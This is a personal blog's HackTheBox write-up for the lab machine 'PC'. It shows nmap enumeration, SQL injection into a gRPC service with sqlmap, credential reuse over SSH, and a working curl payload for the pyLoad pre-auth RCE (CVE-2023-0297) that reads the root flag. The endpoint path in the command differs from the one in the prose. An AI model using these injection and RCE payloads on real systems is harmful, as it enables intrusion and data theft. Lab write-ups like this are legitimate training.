@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        margin-top: 10px;
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3, a {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] PC</h1>
+        <img class="box-icon" src="/hack/images/pc.png"></img>
+        <p><i>Full compromise on June 29, 2023</br>Written on April 3, 2024</i></p>
+        <p>PC is my 12th machine to compromise on HackTheBox. This Linux machine features an SQL injection vulnerability on the gRPC service and a RCE vulnerability on an internal web application named pyLoad.</p>
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan, first scanning for any open ports, then scanning those open ports for more information.</p>
+        <pre><code>nmap 10.10.11.214 -p- --min-rate=5000 -Pn</br>nmap 10.10.11.214 -p22,50051 -sC -sV --min-rate=5000 -Pn</code></pre>
+        <img src="../images/pc2.png">
+        <h3>TCP Port 50051 - gRPC</h3>
+        <p>We can see from the Nmap scan an unknown service on an unusual port, port 50051. We'll try to grab its banner for more information.</p>
+        <pre><code>nc -nv 10.10.11.214 50051</code></pre>
+        <img src="../images/pc3.png">
+        <p>Banner grabbing doesn't yield useful information. We'll try to see if it's a web application by navigating to http://10.10.11.214:50051.</p>
+        <img src="../images/pc4.png">
+        <p>It does listen to http requests, but gives out gibberish.</p>
+        <p>With some Googling, most of the results show that a service named "gRPC" runs on port 50051. The unknown service could be gRPC.</p>
+        <img src="../images/pc5.png">
+        <p>We can find information about a vulnerability by Googling.</p>
+        <img src="../images/pc6.png">
+        <p>We haven't confirmed that this port is using gRPC yet. Luckily, this blog mentions two possible tools we can use: gRPCurl and gRPCui. We will use gRPCui since it has a 
+            graphical interface. Following the gRPCui documentation, we can run it without installing it <i>(I had issues installing it on my silicon Mac).</i></p>
+        <pre><code>go run ./cmd/gRPCui/gRPCui.go -plaintext 10.10.11.214:50051</code></pre>
+        <img src="../images/pc7.png">
+        <p>Grpcui successfully connected to the target machine and now we have this screen:</p>
+        <img src="../images/pc8.png">
+        <p>This verifies that the unknown service on port 50051 on the target machine was using gRPC.</p>
+        <p>Exploring the portal, the gRPC service only has one endpoint named SimpleApp with three methods: LoginUser, RegisterUser, and getInfo. </p>
+        <img src="../images/pc9.png">
+        <p>We can interact with each method, but it seems we can't do anything until we register and login to our own user. If we try to use getInfo, it throws an authorization error and asks for a token.</p>
+        <img src="../images/pc9a.png">
+        <p>We'll register a user with a name of hyken and a password of 1234.</p>
+        <img src="../images/pc10.png">
+        <p>Now we'll login to get our token. </p>
+        <img src="../images/pc11.png">
+        <p>Now that we have our token, we can try to use getInfo. We'll add a "token" header with the token as the value, removing the "b" and the " ' " from the string.
+        </p>
+        <img src="../images/pc12.png">
+        <p>As a result, we get an message from the server saying that the admin is working hard to fix the issue.</p>
+        <img src="../images/pc13.png">
+
+        <h2>Exploit - SQL Injection</h2>
+        <p>The blog stated that gRPC applications are vulnerable to SQL injection attacks. I've confirmed this by changing the ID to "1 union select 99999". The service should
+            throw an error since "1 union select 99999" is not a valid ID, but instead it executed the SQL query and outputted "99999".</p>
+        <img src="../images/pc14.png">
+        <p>Since we know we can use SQL injection, we can capture the request with Burpsuite, throw it in a file, and run SQLmap with it to automate exploitation.</p>
+        <p>First we'll capture the request with Burpsuite.</p>
+        <img src="../images/pc15.png">
+        <p>Then we'll copy the request, paste it in a file named request.txt, and use SQLmap.</p>
+        <pre><code>nano request.txt</br>sqlmap -r request.txt</code></pre>
+        <img src="../images/pc16.png">
+        <p>SQLmap was able to find the vulnerability using 3 different techniques. It also found that it's a SQLite database.</p>
+        <img src="../images/pc17.png">
+        <p>Now we'll extract information from the target's database. First we'll see what kind of tables it holds.</p>
+        <pre><code>sqlmap -r request.txt --tables</code></pre>
+        <img src="../images/pc18.png">
+        <p>The account tables look interesting. We'll dump it.</p>
+        <pre><code>sqlmap -r request.txt -T tables --dump</code></pre>
+        <img src="../images/pc19.png">
+        <p>We now have credentials for user sau. Does this work with SSH?</p>
+        <pre><code>ssh sau@10.10.11.214</br>HereIsYourPassWord1431</code></pre>
+        <img src="../images/pc20.png">
+        <p>Yes it does. We're in. We'll get user flag.</p>
+        <pre><code>cat user.txt</code></pre>
+        <img src="../images/pc21.png">
+
+        <h2>Privilege Escalation - RCE in pyLoad</h2>
+        <p>Performing usual enumeration for privilege escalation, we find a something listening locally on port 8000.</p>
+        <pre><code>netstat -ano</code></pre>
+        <img src="../images/pc22.png">
+        <p>We can view this on our attack browser by using dynamic port forwarding via SSH.</p>
+        <p>We'll SSH into the target machine as sau, but provide the -D option along with port. The -D option will make SSH act as a SOCKS proxy server, 
+            listening to requests on the provided port on the attack machine and forwards the request to the target. This will allow us to navigate to http://127.0.0.1:8000
+            on our browser using the SOCKS protocol, as SSH will forward the request to the target and retrieve the contents at http://127.0.0.1:8000.</p>
+        <pre><code>ssh -D 1080 sau@10.10.11.214</code></pre>
+        <img src="../images/pc23.png">
+        <p>Now I'll navigate to http://127.0.0.1:8000.</p>
+        <p><i>(I have an extension installed on my Firefox browser called FoxyProxy. This allows me to switch proxy servers on the fly within my browser. If I didn't have
+            the extension, then I would've used proxychains to open Firefox.</i></p>
+        <img src="../images/pc24.png">
+        <p>We are greeted with a pyLoad login page. pyLoad is basically an open-source download manager with a web interface, all written in Python. I wasn't able to login to the application, but if we search for an exploit, we get a lot of results mentioning 
+            CVE-2023-0297, a remote code execution vulnerability without the need to authenticate.</p>
+        <img src="../images/pc25.png">
+        <p>Using this GitHub repository "bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad" as reference <i>(this is the one I used at the time)</i>, an attacker can send a crafted POST request
+            to the /flask/addcrypted2 endpoint. The data is passed to a function named eval_js(), which is then passed into js2py.eval_js(). This function executes JavaScript code. </p>
+        <p>Taking it further than just executing JavaScript code, the js2py library has pyimport enabled by default. Pyimport allows importing Python code from JavaScript. This means
+            the js2py.eval_() can execute Python code. This also means an attacker can send malicious Python code to /flask/addcrypted2 and be executed. This is the vulnerability.</p>
+        <p>We can use the exploit code proved in the repository to execute commands. Since we have access to the target machine, we can use the exploit code within the target machine and send the POST request to localhost:8000.</p>
+        <p>If we try to execute any command, we get a 500 error code. We don't have direct output, so we have to do this blind. To get root flag, we can simply read the file and output it to another file in the /tmp directory. This way, we can read the output and get root flag.</p>
+        <pre><code>curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"cat%20/root/root.txt%20%3E%20/tmp/pwned_flag");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://localhost:8000/flash/addcrypted2'</br>cat /tmp/pwned_flag</code></pre>
+        <img src="../images/pc26.png">
+        
+    </div>
+</html>
